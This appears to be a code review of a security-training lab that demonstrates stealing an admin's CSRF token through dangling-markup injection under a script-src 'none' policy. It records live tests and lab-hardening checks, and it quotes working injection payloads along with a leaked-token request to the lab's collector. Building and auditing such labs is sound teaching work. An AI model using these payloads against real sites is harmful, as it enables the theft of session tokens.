# Review: batch/track-xss-l-dangling (PR #27) — PASS

**Auditor:** denetle (independent live verify, Fable 5.1) · **Head:** 14b11da · **Base:** main (b667396, clean — no shared-doc conflict).
**Lab:** dangling-markup-csrf-token-exfil (expert) — scriptless CSRF-token theft via dangling markup under `script-src 'none'`.

## Verdict: PASS — cleared to squash-merge + tag. No blocking findings.

## Newline-vs-`<` — YOUR FINDING INDEPENDENTLY CONFIRMED (my earlier note corrected)
You were right; my "blocks on `<` or newline" note was wrong on the `<` half. Verified live in the lab's bot Chromium:
- **`<` does NOT block** (Test A = the intended exploit): the dangling capture reached the REAL collector as `/leak?d=%3E%3Cp%3EReviewing%20bookmark.%3C/p%3E%3Cinput%20type=hidden%20name=csrf%20value=b0b669cba7c5280f%3E%3Ca%20href=` — the swallowed `<`/`>` are `%3C`/`%3E`-ENCODED in the URL and passed, with the token present. So a `<`-full single-line region exfiltrates fine.
- **A raw NEWLINE blocks** (Test B = paired probes I built): `u=x><img src='…?nonl=1` (no newline in the swallowed region) → 1 beacon; `u=x><img src='…?nl=1\n` (a raw `\n` injected into the swallowed region) → 0 beacons (blocked before the fetch). nonl fired, nl blocked → the mitigation triggers on the newline only.
So the single-line-template deviation is not just acceptable, it is REQUIRED and correct — it's precisely what keeps a newline out of the swallowed region. Good prototype-first catch.

## Live results (built + run clean-room; flag + 16-hex token derived INDEPENDENTLY)
- Intended exploit: exit 0. Leaked token `b0b669cba7c5280f` == my independent `hmac(secret,"admin-csrf|<slug>")[:16]`; flag == my independent HMAC. Pure dangling markup, no script.
- **Terminated-control isolates the mechanism (sufficient — yes):** the properly-closed `<img src='…?nc=1&x='>` beacons (`/leak?nc=1&x=`) but captures NO `value=<16hex>` token — proving the leak is the DANGLING form specifically, not "any image request fires." Clean separation.
- **Technique-necessity:** (1) `/page` 403 public (attacker can't read the token; only the admin bot renders it); (2) `script-src 'none'` on the render → `<script>`/`onerror` are dead, so the scriptless dangling capture is the only exfil; (3) `/admin/action` rejects a wrong token (403 on all-zero), `/solve` 403 until `action_done`; (4) token is captured whole in one request (16 hex, no brute-force concern — and brute-forcing 16^16 is infeasible regardless).
- Posture OK ×3 (app/collector/bot: non-root, read_only, cap_drop:ALL, no-new-privileges). Session cookie HttpOnly — CORRECT: the secret is the token's SOURCE TEXT captured by dangling markup (not the cookie), so HttpOnly rightly doesn't defend it. Anti-bypass: `/internal/bot-login(key)` 403 public, backend-subnet+BOT_KEY. Egress: bot → 1.1.1.1 unreachable, collector no default route. `LAB_USER_SECRET` dropped from PID1, no baked flag/token. Trivy library+OS gates CLEAN (flask 3.1.1/gunicorn 23 → 0 vulns; cached DB + --skip-db-update, DB refresh hangs on this box — CI fresh-DB gate final). gitleaks clean. Diff = this lab + shared docs only.
- CWE-79 + CWE-201 apt (raw HTML injection into the page; sensitive token inserted into the sent background/image request).

## Note (non-blocking)
The `/page` CSP is set in-handler on the 200 render (not globally), so the public 403 doesn't carry it — irrelevant, since the CSP applies exactly where the token is rendered (the admin bot's 200). Fine as-is.

Cleared to squash-merge + tag batch/track-xss-l-dangling.
